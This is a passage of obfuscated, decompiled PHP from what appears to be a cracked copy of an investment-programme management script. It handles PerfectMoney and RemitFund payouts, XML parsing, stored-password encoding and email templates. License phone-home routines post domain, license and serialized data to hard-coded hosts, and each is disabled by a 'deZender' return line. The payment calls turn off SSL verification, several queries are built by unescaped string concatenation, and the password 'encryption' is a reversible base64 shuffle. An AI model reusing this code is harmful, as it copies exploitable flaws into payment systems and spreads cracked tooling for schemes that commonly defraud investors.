        while (!$elnlcQfSk)
        {
          $elnlcdEjT = trim (substr ($elnlcPJGU, $elnlcGGizO + 7, $elnlcRUEN - 7));
          $elnlcPJGU = trim (substr ($elnlcPJGU, $elnlcRUEN + 8));
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlccyps ($elnlcdEjT, 'text');
          $elnlctcyj[$elnlcFAei['elnlcOBtk']] = elnlccyps ($elnlcdEjT, 'additional');
          if ($elnlcthMlW = stristr ($elnlcPJGU, '<error>') === false)
          {
            $elnlcQfSk = true;
          }
          else
          {
            $elnlcGGizO = strlen ($elnlcPJGU) - strlen ($elnlcthMlW);
          }

          if ($elnlcDCnn = stristr ($elnlcPJGU, '</error>') === false)
          {
            $elnlcQfSk = true;
            continue;
          }
          else
          {
            $elnlcRUEN = strlen ($elnlcPJGU) - strlen ($elnlcDCnn);
            continue;
          }
        }

        $elnlcOeNVC = trim (substr ($elnlcOeNVC, $elnlcdWFDc + 16));
        if ($elnlcJBwK = stristr ($elnlcOeNVC, '<errorresponse>') === false)
        {
          $elnlcwmdNp = true;
        }
        else
        {
          $elnlcaLFBB = strlen ($elnlcOeNVC) - strlen ($elnlcJBwK);
        }

        if ($elnlcJycxj = stristr ($elnlcOeNVC, '</errorresponse>') === false)
        {
          $elnlcwmdNp = true;
          continue;
        }
        else
        {
          $elnlcdWFDc = strlen ($elnlcOeNVC) - strlen ($elnlcJycxj);
          continue;
        }
      }
    }

    return $elnlctcyj;
  }

  function elnlcuojau ($elnlcqcAV, $elnlccdtj)
  {
    global $elnlcFAei;
    $elnlcBhlr = strlen ($elnlccdtj) + 2;
    $elnlcGPoB = strpos ($elnlcqcAV, '' . '<' . $elnlccdtj . ' ');
    $elnlcbyWpf = strpos ($elnlcqcAV, '' . '<' . $elnlccdtj . '>');
    if ($elnlcGPoB !== false)
    {
      $elnlcaLFBB = $elnlcGPoB;
    }

    if ($elnlcbyWpf !== false)
    {
      $elnlcaLFBB = $elnlcbyWpf;
    }

    if ($elnlcaLFBB === false)
    {
      return '';
    }

    if ($elnlcdWFDc = strpos ($elnlcqcAV, '' . '</' . $elnlccdtj . '>') === false)
    {
      return '';
    }

    $elnlcDOSF = strpos ($elnlcqcAV, '>', $elnlcaLFBB);
    $elnlcgVKz = trim (substr ($elnlcqcAV, $elnlcDOSF + 1, $elnlcdWFDc - ($elnlcaLFBB + $elnlcBhlr)));
    return $elnlcgVKz;
  }

  function elnlclqmra ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcuVDtK = elnlcuojau ($elnlchlvLi, 'Receipt');
    if ($elnlcuVDtK != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
      $elnlcsdWLB = $elnlcuVDtK;
      $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlcuojau ($elnlcsdWLB, 'ReceiptId');
      $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlcuojau ($elnlcsdWLB, 'Payer');
      $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlcuojau ($elnlcsdWLB, 'Payee');
      $elnlcLqoWI = elnlcuojau ($elnlcsdWLB, 'Equivalent');
      $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlcuojau ($elnlcLqoWI, 'Amount');
      $elnlctcyj[$elnlcFAei['elnlcvvGo']] = elnlcuojau ($elnlcLqoWI, 'CurrencyId');
    }

    $elnlcOeNVC = elnlcuojau ($elnlchlvLi, 'ErrorResponse');
    if ($elnlcOeNVC != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
      $elnlcdEjT = $elnlcOeNVC;
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlcuojau ($elnlcdEjT, 'Text');
      $elnlctcyj[$elnlcFAei['elnlcOBtk']] = elnlcuojau ($elnlcdEjT, 'Additional');
    }

    return $elnlctcyj;
  }

  function elnlcveefn ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcuVDtK = elnlcuojau ($elnlchlvLi, 'Receipt');
    if ($elnlcuVDtK != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
      $elnlcsdWLB = $elnlcuVDtK;
      $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlcuojau ($elnlcsdWLB, 'ReceiptId');
      $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlcuojau ($elnlcsdWLB, 'Payer');
      $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlcuojau ($elnlcsdWLB, 'Payee');
      $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlcuojau ($elnlcsdWLB, 'Amount');
      $elnlctcyj[$elnlcFAei['elnlcvvGo']] = elnlcuojau ($elnlcsdWLB, 'CurrencyId');
    }

    $elnlcOeNVC = elnlcuojau ($elnlchlvLi, 'Balance');
    if ($elnlcOeNVC != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
      $elnlcdEjT = $elnlcOeNVC;
      $elnlctcyj[$elnlcFAei['elnlccRfF']] = elnlcuojau ($elnlcdEjT, 'Value');
    }

    $elnlcOeNVC = elnlcuojau ($elnlchlvLi, 'Error');
    if ($elnlcOeNVC != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
      $elnlcdEjT = $elnlcOeNVC;
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlcuojau ($elnlcdEjT, 'Text');
      $elnlctcyj[$elnlcFAei['elnlcOBtk']] = elnlcuojau ($elnlcdEjT, 'Description');
    }

    return $elnlctcyj;
  }

  function elnlcqwgh ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcuVDtK = elnlcuojau ($elnlchlvLi, 'Status');
    if (elnlcuojau ($elnlcuVDtK, 'Code') == $elnlcFAei['elnlcakxH'])
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
    }
    else
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlcuojau ($elnlchlvLi, 'Message');
    }

    $elnlctnHB = elnlcuojau ($elnlchlvLi, 'Balance');
    if ($elnlctnHB != '')
    {
      $elnlctcyj[$elnlcFAei['elnlccRfF']] = $elnlctnHB;
    }

    $elnlcuVDtK = elnlcuojau ($elnlchlvLi, 'Transfer');
    if ($elnlcuVDtK != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlcuojau ($elnlcuVDtK, 'Payer');
      $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlcuojau ($elnlcuVDtK, 'Payee');
      $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlcuojau ($elnlcuVDtK, 'Amount');
      $elnlctcyj[$elnlcFAei['elnlcmCqPN']] = elnlcuojau ($elnlcuVDtK, 'Memo');
      $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlcuojau ($elnlcuVDtK, 'Batch');
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlcuojau ($elnlcuVDtK, 'Message');
    }

    return $elnlctcyj;
  }

  function elnlcebii ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 18);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcfcGkH = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        list ($elnlcfcGkH, $elnlcxAUm) = preg_split ('/\\|/', $elnlchAzqM);
        $elnlcGWAnG[$elnlcFAei['elnlcviuM']] = $elnlcxAUm;
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcNKGk']]) . '&PassPhrase=' . rawurlencode ($elnlcfcGkH) . '&Payer_Account=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcviuM']]) . '&Payee_Account=' . rawurlencode ($elnlcrIPNm) . '&Amount=' . rawurlencode ($elnlcLMULg) . ('' . '&Memo=' . $elnlcoWGTg));
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcCDlqo = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcCDlqo))
      {
        return array (1, '', $elnlcCDlqo[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcCDlqo))
        {
          $elnlcpLkhm = preg_replace ('/&lt;/i', '<', $elnlcCDlqo[1]);
          $elnlcpLkhm = preg_replace ('/&gt;/i', '>', $elnlcpLkhm);
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcpLkhm);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ('' . ' ' . $elnlcpLkhm), '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcnvfui ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 25);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcCwza = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $elnlcDMPMf = $elnlcGWAnG[$elnlcFAei['elnlcAsWGN']];
      }
      else
      {
        list ($elnlcCwza, $elnlcDMPMf) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcwTIz = strtoupper (md5 ('' . $elnlcDMPMf . 'transferUSD' . $elnlcGWAnG[$elnlcFAei['elnlcHugF']] . $elnlcrIPNm . $elnlcLMULg . strtoupper (md5 ($elnlcCwza))));
      $elnlcqcAV = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcDMPMf) . ('' . '</ApiName>
    <Token>' . $elnlcwTIz . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlcHugF']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcqcAV));
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $elnlconxJh = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcGUFH, CURLOPT_HTTPHEADER, $elnlconxJh);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlctcyj = elnlcucmsp ($a);
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
      {
        return array (1, '', $elnlctcyj[$elnlcFAei['elnlcvQzwa']]);
      }
      else
      {
        if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlctcyj[$elnlcFAei['elnlcAIzUn']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcucmsp ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcuVDtK = elnlcuojau ($elnlchlvLi, 'Response');
    if ($elnlcuVDtK != '')
    {
      $elnlcsdWLB = $elnlcuVDtK;
      $elnlctcyj[$elnlcFAei['elnlcrgMP']] = elnlcuojau ($elnlcsdWLB, 'Code');
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlcuojau ($elnlcsdWLB, 'Message');
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = ($elnlctcyj[$elnlcFAei['elnlcrgMP']] == 0 ? 'ok' : 'error');
      $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlcuojau ($elnlcsdWLB, 'TransferId');
      $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlcuojau ($elnlcsdWLB, 'Payer');
      $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlcuojau ($elnlcsdWLB, 'Payee');
      $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlcuojau ($elnlcsdWLB, 'Amount');
      $elnlctcyj[$elnlcFAei['elnlcvvGo']] = elnlcuojau ($elnlcsdWLB, 'Currency');
    }

    return $elnlctcyj;
  }

  function elnlcqhogo ($elnlcIojlg, $a)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcqgium ($elnlcIojlg);
    }

    $elnlcEhIBC = base64_encode ($elnlcIojlg);
    $a = preg_split ('//', $elnlcEhIBC);
    $b = preg_split ('//', md5 ($elnlcIojlg) . base64_encode ($elnlcIojlg));
    $elnlcEhIBC = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcEhIBC = $elnlcEhIBC . $a[$i] . $b[$i];
    }

    $elnlcEhIBC = str_replace ('=', '!!!^', $elnlcEhIBC);
    return elnlcprsg ($elnlcEhIBC, $elnlcGWAnG[$elnlcFAei['elnlcBgyc']], $elnlcFAei['elnlceUUg']);
  }

  function elnlcuexwr ($elnlcIojlg, $a)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcqgium ($elnlcIojlg);
    }

    $elnlcIojlg = str_replace ('!!!^', '=', elnlcsrkfq ($elnlcIojlg, $elnlcGWAnG[$elnlcFAei['elnlcBgyc']], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $elnlcIojlg);
    $elnlcIojlg = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < sizeof ($a); $i += 2)
    {
      $elnlcIojlg .= $a[$i - 1];
    }

    $elnlcEhIBC = base64_decode ($elnlcIojlg);
    return $elnlcEhIBC;
  }

  function elnlcqgium ($elnlcIojlg)
  {
    global $elnlcFAei;
    $elnlcEhIBC = base64_encode ($elnlcIojlg);
    $a = preg_split ('//', $elnlcEhIBC);
    $b = preg_split ('//', md5 ($elnlcIojlg) . base64_encode ($elnlcIojlg));
    $elnlcEhIBC = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < sizeof ($a); ++$i)
    {
      $elnlcEhIBC = $elnlcEhIBC . $a[$i] . $b[$i];
    }

    $elnlcEhIBC = str_replace ('=', '!!!^', $elnlcEhIBC);
    return $elnlcEhIBC;
  }

  function elnlcklvns ($elnlcIojlg)
  {
    global $elnlcFAei;
    $elnlcIojlg = str_replace ('!!!^', '=', $elnlcIojlg);
    $a = preg_split ('//', $elnlcIojlg);
    $elnlcIojlg = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < sizeof ($a); $i += 2)
    {
      $elnlcIojlg .= $a[$i - 1];
    }

    $elnlcEhIBC = base64_decode ($elnlcIojlg);
    return $elnlcEhIBC;
  }

  function elnlcmtscs ()
  {
    global $elnlcFAei;
    global $elnlcLjgi;
    global $elnlcGWAnG;
return;	// Added by deZender, 2010.01.30
    $elnlcVqVjJ = ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 1 ? '64.27.18.142' : $elnlcFAei['elnlcbIsU']);
    $elnlcycexu = @fopen ($elnlcFAei['elnlcMiet'] . $elnlcVqVjJ . '/check.cgi?domain=' . $elnlcLjgi[$elnlcFAei['elnlcGkup']] . '&license=' . $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcycexu)
    {
      fclose ($elnlcycexu);
    }

  }

  function elnlcdugyn ()
  {
    global $elnlcFAei;
    global $elnlcLjgi;
    global $elnlcGWAnG;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlcFAei['elnlczkHC'];
      while ($i < 2)
      {
        $elnlcGUFH = curl_init ();
        if ($i == 1)
        {
          $elnlcVqVjJ = '64.27.18.142';
        }
        else
        {
          $elnlcVqVjJ = 'www.dnsargentina.com.ar';
        }

        $elnlcltRw = 'http://' . $elnlcVqVjJ . '/check.cgi?install=1&script=3&domain=' . $elnlcLjgi[$elnlcFAei['elnlcGkup']] . '&license=' . $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcGUFH, CURLOPT_URL, $elnlcltRw);
        curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcGUFH);
        curl_close ($elnlcGUFH);
        if ($l != '')
        {
          $i = $elnlcFAei['elnlcOHKNB'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcycexu = @fopen ($elnlcFAei['elnlcEEoiJ'] . $elnlcLjgi[$elnlcFAei['elnlcGkup']] . '&license=' . $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcycexu)
      {
        $l = fread ($elnlcycexu, 200000);
        fclose ($elnlcycexu);
      }
    }

    return $l;
  }

  function elnlceijon ()
  {
    global $elnlcFAei;
  }

  function elnlcpehpk ($elnlcDLLME)
  {
    global $elnlcFAei;
    global $elnlcLjgi;
    global $elnlcGWAnG;
return;	// Added by deZender, 2010.01.30
    $elnlcuFfm = base64_encode ($elnlcDLLME);
    $elnlcGUFH = curl_init ();
    $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
    if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 1)
    {
      $elnlcVqVjJ = '64.27.18.142';
    }
    else
    {
      if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 2)
      {
        $elnlcVqVjJ = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcVqVjJ = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcGUFH, CURLOPT_URL, 'http://' . $elnlcVqVjJ . $elnlcFAei['elnlcStPxI']);
    curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
    curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcuFfm . '&domain=' . $elnlcLjgi[$elnlcFAei['elnlcGkup']] . '&s=p&license=' . $elnlcGWAnG[$elnlcFAei['elnlcmAwf']]);
    curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcGUFH);
    curl_close ($elnlcGUFH);
    return chop ($l);
  }

  function elnlcjdij ($elnlcDLLME, $elnlchDPat = 0)
  {
    global $elnlcFAei;
    global $elnlcLjgi;
    global $elnlcGWAnG;
return;	// Added by deZender, 2010.01.30
    if ($elnlchDPat == 1)
    {
      $elnlcuFfm = substr (trim ($elnlcDLLME), 0, 32);
    }
    else
    {
      $elnlcuFfm = base64_encode (serialize ($elnlcDLLME));
    }

    $elnlcGUFH = curl_init ();
    $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
    if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 1)
    {
      $elnlcVqVjJ = '64.27.18.142';
    }
    else
    {
      if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 2)
      {
        $elnlcVqVjJ = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcVqVjJ = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcGUFH, CURLOPT_URL, 'http://' . $elnlcVqVjJ . $elnlcFAei['elnlcqEGWR']);
    curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
    curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcuFfm . '&mode=' . $elnlchDPat . '&domain=' . $elnlcLjgi[$elnlcFAei['elnlcGkup']] . '&s=p&license=' . $elnlcGWAnG[$elnlcFAei['elnlcmAwf']]);
    curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcGUFH);
    curl_close ($elnlcGUFH);
    if ($elnlchDPat == 1)
    {
      $elnlctcyj = array ();
      if ($l != 'nill')
      {
        $elnlctcyj = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlctcyj))
        {
          $elnlctcyj = array ();
        }
      }

      return $elnlctcyj;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcqayqa ($elnlcxqkx, $elnlcGqyFq, $elnlcyTVyv, $elnlcQtyf)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlcxqkx . '\'';
    $elnlcSQAa = mysql_query ($q);
    $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
    if (!$elnlctLoC)
    {
      return null;
    }

    if (!$elnlctLoC[$elnlcFAei['elnlcJzws']])
    {
      return null;
    }

    $elnlcsqHn = $elnlctLoC[$elnlcFAei['elnlcAIzUn']];
    $elnlcyuNp = $elnlctLoC[$elnlcFAei['elnlcrPcOl']];
    $elnlcottmq = $elnlctLoC[$elnlcFAei['elnlcvuOwF']];
    foreach ($elnlcQtyf as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcsqHn = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcsqHn);
      $elnlcottmq = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcottmq);
      if ($elnlctLoC[$elnlcFAei['elnlcmaBFi']])
      {
        $elnlcyuNp = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcyuNp);
        continue;
      }
    }

    $elnlcsqHn = preg_replace ('/#site_name#/', $elnlcGWAnG[$elnlcFAei['elnlcGSktp']], $elnlcsqHn);
    if ($elnlctLoC[$elnlcFAei['elnlcmaBFi']])
    {
      $elnlcyuNp = preg_replace ('/#site_name#/', $elnlcGWAnG[$elnlcFAei['elnlcGSktp']], $elnlcyuNp);
    }

    $elnlcottmq = preg_replace ('/#site_name#/', $elnlcGWAnG[$elnlcFAei['elnlcGSktp']], $elnlcottmq);
    $elnlcsqHn = preg_replace ('/#site_url#/', $elnlcGWAnG[$elnlcFAei['elnlcRTeW']], $elnlcsqHn);
    if ($elnlctLoC[$elnlcFAei['elnlcmaBFi']])
    {
      $elnlcyuNp = preg_replace ('/#site_url#/', $elnlcGWAnG[$elnlcFAei['elnlcRTeW']], $elnlcyuNp);
    }

    $elnlcottmq = preg_replace ('/#site_url#/', $elnlcGWAnG[$elnlcFAei['elnlcRTeW']], $elnlcottmq);
    if ($elnlctLoC[$elnlcFAei['elnlcmaBFi']])
    {
      $elnlcUDJb = elnlcyrisq (12);
      $elnlcsqHn = elnlcvkgel ($elnlcsqHn);
      $elnlcyuNp = elnlcvngb ($elnlcyuNp);
      $elnlcCHnU = '' . '--' . $elnlcUDJb . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcsqHn . '

--' . $elnlcUDJb . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlcyuNp . '

--' . $elnlcUDJb . '--';
    }
    else
    {
      $elnlcCHnU = $elnlcsqHn;
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      $elnlcNtRH = fopen ($elnlcFAei['elnlcFVbu'], $elnlcFAei['elnlcEPPQ']);
      fwrite ($elnlcNtRH, '' . 'TO: ' . $elnlcGqyFq . '
From: ' . $elnlcyTVyv . '
Subject: ' . $elnlcottmq . '

' . $elnlcsqHn . '

');
      fclose ($elnlcNtRH);
    }
    else
    {
      mail ($elnlcGqyFq, $elnlcottmq, $elnlcCHnU, '' . 'From: ' . $elnlcyTVyv . '
Reply-To: ' . $elnlcyTVyv . ($elnlctLoC[$elnlcFAei['elnlcmaBFi']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcUDJb : ''));
    }

  }

  function elnlcqvluy ($elnlcuFfm)
  {
    global $elnlcFAei;
    $elnlcuFfm = str_replace ('
', '
', $elnlcuFfm);
    $elnlcuFfm = str_replace ('
', '
', $elnlcuFfm);
    return $elnlcuFfm;
  }

  function elnlcvkgel ($elnlcuFfm)
  {
    global $elnlcFAei;
    $elnlcsRvy = elnlcqvluy ($elnlcuFfm);
    if (substr ($elnlcsRvy, 0 - strlen ('
')) != '
')
    {
      $elnlcsRvy .= '
';
    }

    return $elnlcsRvy;
  }

  function elnlcvngb ($elnlcuFfm)
  {
    global $elnlcFAei;
    $elnlcsRvy = elnlcqvluy ($elnlcuFfm);
    if (substr ($elnlcsRvy, 0 - strlen ('
')) != '
')
    {
      $elnlcsRvy .= '
';
    }

